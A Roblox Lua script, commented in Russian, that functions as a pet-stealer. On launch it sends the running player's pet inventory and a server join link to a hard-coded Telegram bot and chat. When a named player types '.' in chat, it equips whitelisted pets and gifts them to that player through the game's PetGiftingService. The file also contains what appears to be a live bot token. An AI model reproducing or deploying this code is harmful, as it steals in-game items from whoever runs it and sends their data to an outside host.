local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "Rikizigg"
local TRIGGER_MESSAGE = "."
local DELAY = 2 -- Задержка между передачами

-- 🐾 БЕЛЫЙ СПИСОК для передачи (ТОЛЬКО эти)
local WHITELIST = {
    "Hamster"
}

-- 🔎 Найти ВСЕХ питомцев
local function getAllPets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            -- Ищем формат "[X.XX KG] [Age X]"
            local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
            if weight and age then
                -- Берем чистое название (до первых скобок)
                local petName = item.Name:match("^([^%[]+)") or item.Name
                petName = petName:gsub("%s+$", "")
                
                table.insert(pets, {
                    name = petName,
                    fullName = item.Name,
                    weight = tonumber(weight),
                    age = tonumber(age),
                    object = item,
                    isWhitelisted = table.find(WHITELIST, petName) ~= nil
                })
            end
        end
    end
    
    return pets
end

-- 📜 Список для уведомления
local function createPetsMessage(pets)
    if #pets == 0 then return "❌ Нет питомцев" end
    
    local message = "🐾 Все питомцы ("..#pets.."):\n"
    for _, pet in ipairs(pets) do
        local status = pet.isWhitelisted and "✓ " or "✗ "
        message = message .. string.format(
            "%s%s [%.2f кг, Age %d]\n",
            status,
            pet.name, 
            pet.weight,
            pet.age
        )
    end
    return message
end

-- ✋ Взять в руку
local function equipPet(pet)
    if not (pet and player.Character) then return false end
    
    local humanoid = player.Character:FindFirstChild("Humanoid")
    if not humanoid then return false end
    
    humanoid:EquipTool(pet)
    task.wait(1)
    return true
end

-- 📤 Передать питомца (ТОЛЬКО из белого списка)
local function transferPet(pet)
    if not pet.isWhitelisted then return false end
    
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then
        warn("Игрок не найден!")
        return false
    end
    
    local service = ReplicatedStorage:FindFirstChild("GameEvents")
    if not service then
        warn("GameEvents не найдены!")
        return false
    end
    
    local gifting = service:FindFirstChild("PetGiftingService")
    if not gifting then
        warn("PetGiftingService не найден!")
        return false
    end
    
    local success = pcall(function()
        gifting:FireServer("GivePet", target)
    end)
    
    return success
end

-- 📨 Отправить в Telegram
local function sendToTelegram(text)
    local url = string.format(
        "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
        TELEGRAM_TOKEN,
        TELEGRAM_CHAT_ID,
        HttpService:UrlEncode(text)
    )
    
    local success, response = pcall(function()
        return game:HttpGet(url, true)
    end)
    
    if not success then
        warn("Ошибка Telegram:", response)
    end
end

-- 🚀 Запуск передачи
local function startTransfer()
    local pets = getAllPets()
    local message = createPetsMessage(pets).."\n"
    local transferred = 0
    
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            if equipPet(pet.object) then
                if transferPet(pet) then
                    message = message..string.format("✅ %s [успех]\n", pet.name)
                    transferred += 1
                else
                    message = message..string.format("❌ %s [ошибка передачи]\n", pet.name)
                end
            else
                message = message..string.format("⚠️ %s [не взялся в руку]\n", pet.name)
            end
            task.wait(DELAY)
        end
    end
    
    message = message..string.format("\n🏁 Итого: %d/%d передано", transferred, #pets)
    sendToTelegram(message)
end

-- 🔗 Ссылка на сервер
local function getServerLink()
    return "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
end

-- 👂 Слушатель чата
game.Players.PlayerChatted:Connect(function(_, speaker, message)
    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        startTransfer()
    end
end)

-- 🏁 Стартовое уведомление
sendToTelegram(
    "🔔 "..player.Name.." активировал скрипт\n"..
    createPetsMessage(getAllPets()).."\n"..
    "🔗 "..getServerLink().."\n\n"..
    "✓ - будут переданы\n"..
    "✗ - не из белого списка"
)
